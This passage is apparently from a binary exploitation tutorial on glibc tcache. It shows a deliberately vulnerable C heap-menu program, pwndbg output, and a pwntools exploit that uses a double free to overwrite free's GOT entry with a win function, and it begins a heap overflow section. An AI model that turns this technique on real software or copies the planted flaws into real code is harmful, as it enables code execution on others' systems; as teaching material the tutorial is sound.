</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;2&#39;</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sscanf</span>(buf <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(FREE), <span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>n);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">free_chunk</span>(n);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;3&#39;</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sscanf</span>(buf <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(EDIT), <span style="color:#e6db74">&#34;%d %[^</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">]&#34;</span>, <span style="color:#f92672">&amp;</span>n, str);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">edit</span>(n, str);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">list</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; gcc df.c -o df -no-pie
</span></span><span style="display:flex;"><span>&gt; patchelf --set-interpreter ./ld-2.27.so --set-rpath . ./df
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">17808</span>
</span></span><span style="display:flex;"><span>drwxrwxr-x  <span style="color:#ae81ff">2</span> at0m at0m     <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">26</span> 17:03 .
</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">21</span> at0m at0m     <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">26</span> 17:03 ..
</span></span><span style="display:flex;"><span>-rwsr-sr-x  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">21688</span> Jun <span style="color:#ae81ff">26</span> 17:03 df
</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> at0m at0m     <span style="color:#ae81ff">2087</span> Jun <span style="color:#ae81ff">26</span> 17:03 df.c
</span></span><span style="display:flex;"><span>-rwxrwxr-x  <span style="color:#ae81ff">1</span> at0m at0m  <span style="color:#ae81ff">1386480</span> Jun <span style="color:#ae81ff">26</span> 17:03 ld-2.27.so
</span></span><span style="display:flex;"><span>-rwxrwxr-x  <span style="color:#ae81ff">1</span> at0m at0m <span style="color:#ae81ff">16803192</span> Jun <span style="color:#ae81ff">26</span> 17:03 libc.so.6
</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> at0m at0m      <span style="color:#ae81ff">117</span> Jun <span style="color:#ae81ff">26</span> 17:03 README.md
</span></span></code></pre></div><p>Binary is same except for change in vulnerability to exploit. This time we can&rsquo;t edit the freed chunk (Ya can check from GDB).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non-debugging symbols:
</span></span><span style="display:flex;"><span>0x0000000000401000  _init
</span></span><span style="display:flex;"><span>0x0000000000401100  free@plt
</span></span><span style="display:flex;"><span>0x0000000000401110  puts@plt
</span></span><span style="display:flex;"><span>0x0000000000401120  strlen@plt
</span></span><span style="display:flex;"><span>0x0000000000401130  __stack_chk_fail@plt
</span></span><span style="display:flex;"><span>0x0000000000401140  setbuf@plt
</span></span><span style="display:flex;"><span>0x0000000000401150  fputs@plt
</span></span><span style="display:flex;"><span>0x0000000000401160  read@plt
</span></span><span style="display:flex;"><span>0x0000000000401170  fprintf@plt
</span></span><span style="display:flex;"><span>0x0000000000401180  memcpy@plt
</span></span><span style="display:flex;"><span>0x0000000000401190  malloc@plt
</span></span><span style="display:flex;"><span>0x00000000004011a0  __isoc99_sscanf@plt
</span></span><span style="display:flex;"><span>0x00000000004011b0  fwrite@plt
</span></span><span style="display:flex;"><span>0x00000000004011c0  execl@plt
</span></span><span style="display:flex;"><span>0x00000000004011d0  _start
</span></span><span style="display:flex;"><span>0x0000000000401200  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>0x0000000000401210  deregister_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401240  register_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401280  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>0x00000000004012b0  frame_dummy
</span></span><span style="display:flex;"><span>0x00000000004012b6  print_menu
</span></span><span style="display:flex;"><span>0x0000000000401359  allocate
</span></span><span style="display:flex;"><span>0x0000000000401405  free_chunk
</span></span><span style="display:flex;"><span>0x0000000000401488  edit
</span></span><span style="display:flex;"><span>0x000000000040156a  list
</span></span><span style="display:flex;"><span>0x0000000000401682  win
</span></span><span style="display:flex;"><span>0x00000000004016c5  main
</span></span><span style="display:flex;"><span>0x0000000000401840  __libc_csu_init
</span></span><span style="display:flex;"><span>0x00000000004018b0  __libc_csu_fini
</span></span><span style="display:flex;"><span>0x00000000004018b8  _fini
</span></span></code></pre></div><p>A <strong>Double Free</strong> vulnerability occurs when a program calls the <code>free()</code> function more than once on the same memory address, leading to <strong>undefined behavior</strong>. In the context of <strong>tcache (thread cache)</strong> a fast, per-thread allocator introduced in <strong>glibc 2.26</strong>  double frees can be especially dangerous. When a chunk is freed, it&rsquo;s added to the tcache freelist. If the same chunk is freed again without being reallocated, it gets added to the freelist multiple times. This creates a situation where the same memory chunk appears more than once in the list of free chunks. An attacker can exploit this to allocate the same chunk multiple times using <code>malloc()</code>, effectively gaining multiple pointers to the same memory location. By manipulating these pointers, the attacker can corrupt memory such as overwriting function pointers, GOT entries, or heap metadata leading to powerful exploits like arbitrary code execution or control flow hijacking. Tcache makes exploitation easier because it lacks the strict checks present in older heap management systems like fastbins, allowing double free conditions to slip through more easily if not properly mitigated.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; r
</span></span><span style="display:flex;"><span>Starting program: /home/at0m/Downloads/hack/Youtube/Binary Exploitation/I. Heap Tcache Double Free/df 
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>1. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>2. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>3. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>4. list chunks
</span></span><span style="display:flex;"><span>5. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>Allocating <span style="color:#ae81ff">8</span> bytes
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>6. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>7. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>8. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>9. list chunks
</span></span><span style="display:flex;"><span>10. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Freeing pointer 0: 0xd353260
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>11. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>12. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>13. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>14. list chunks
</span></span><span style="display:flex;"><span>15. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Freeing pointer 0: 0xd353260
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>16. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>17. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>18. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>19. list chunks
</span></span><span style="display:flex;"><span>20. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>Index	Pointers	Requested Size	Status
</span></span><span style="display:flex;"><span>0	0xd353260	8	Freed
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>21. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>22. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>23. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>24. list chunks
</span></span><span style="display:flex;"><span>25. exit
</span></span><span style="display:flex;"><span>^C
</span></span><span style="display:flex;"><span>Program received signal SIGINT, Interrupt.
</span></span></code></pre></div><p>We allocated and freed chunk 2 times of same index and now if we look using <code>vis</code> command.</p>
<p><img src="/img/double_free.png" alt="double_free.png"></p>
<p>As we can see one chunk has two Tcache and its Forward Pointer is also pointing to itself. We can check by command <code>tcachebins</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; tcachebins
</span></span><span style="display:flex;"><span>tcachebins
</span></span><span style="display:flex;"><span>0x20 <span style="color:#f92672">[</span>  2<span style="color:#f92672">]</span>: 0xd353260 ‚óÇ‚Äî 0xd353260 /* <span style="color:#e6db74">&#39;`25\r&#39;</span> */
</span></span></code></pre></div><p><code>But how can we take advantage of it?</code>. We know that our task is same as before to call win function by putting value of GOT in Forward Pointer.</p>
<p>To take advantage of a <strong>double free vulnerability in the tcache</strong>, the we can exploit the fact that the same memory chunk appears multiple times in the tcache freelist. When the same chunk is freed twice, both entries in the freelist point to the same memory address, allowing the us to control the tcache&rsquo;s <strong>forward pointer</strong> during the next allocation. This opens the door to a powerful technique: after the first <code>malloc</code> returns the chunk, We can overwrite its forward pointer with a <strong>target address</strong>, such as a <strong>Global Offset Table (GOT) entry</strong>. On the next <code>malloc</code>, the memory allocator will return a pointer to that target address instead of a regular heap chunk. This allows the attacker to write arbitrary data to sensitive locations in memory. For example, by overwriting a GOT entry with the address of a <code>win()</code> function, the attacker can redirect the program‚Äôs control flow and gain unintended behavior or execution, effectively turning a heap corruption bug into full code execution.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>EXE <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;./df&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL_LIBC:
</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>libc
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    library_path <span style="color:#f92672">=</span> libcdb<span style="color:#f92672">.</span>download_libraries(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> library_path:
</span></span><span style="display:flex;"><span>        exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF<span style="color:#f92672">.</span>patch_custom_libraries(exe<span style="color:#f92672">.</span>path, library_path)
</span></span><span style="display:flex;"><span>        libc <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>libc
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">tbreak main
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(size):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(index):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;2 </span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(index,data):
</span></span><span style="display:flex;"><span>    temp <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;3 </span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,temp<span style="color:#f92672">+</span>data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -- Exploit goes here --</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Now we can focus on main exploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>EXE <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;./df&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL_LIBC:
</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>libc
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    library_path <span style="color:#f92672">=</span> libcdb<span style="color:#f92672">.</span>download_libraries(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> library_path:
</span></span><span style="display:flex;"><span>        exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF<span style="color:#f92672">.</span>patch_custom_libraries(exe<span style="color:#f92672">.</span>path, library_path)
</span></span><span style="display:flex;"><span>        libc <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>libc
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">tbreak main
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(size):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(index):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;2 </span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(index,data):
</span></span><span style="display:flex;"><span>    temp <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;3 </span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,temp<span style="color:#f92672">+</span>data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -- Exploit goes here --</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 1: Allocate a chunk of 8 bytes</span>
</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 2: Free the chunk twice (double free vulnerability)</span>
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 3: First malloc returns the chunk and we overwrite its forward pointer</span>
</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">1</span>, pack(exe<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>free))  <span style="color:#75715e"># Overwrite tcache forward pointer with GOT entry of `free`</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 4: Second malloc returns the same chunk again</span>
</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 5: Third malloc returns a chunk at the GOT entry of `free`</span>
</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 6: Overwrite GOT entry of `free` with the address of `win`</span>
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">3</span>, pack(exe<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>win))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 7: Call `free` on any chunk to trigger the overwritten GOT entry (now points to `win`)</span>
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="0x16---heap-overflow-tcache">0x16 - Heap Overflow Tcache</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MALLOC &#34;1&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FREE &#34;2&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define LIST &#34;4&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define EDIT &#34;3&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define EXIT &#34;5&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define FREED 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define UNDERUSE 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> ptrs[<span style="color:#ae81ff">100</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> used[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> request_size[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> cnt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_menu</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>MENU[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Choose from the following menu:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;1. malloc chunk eg 1 20</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;2. free chunk eg 2 0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;3. edit chunk content eg 3 0 AAAA</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;4. list chunks</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
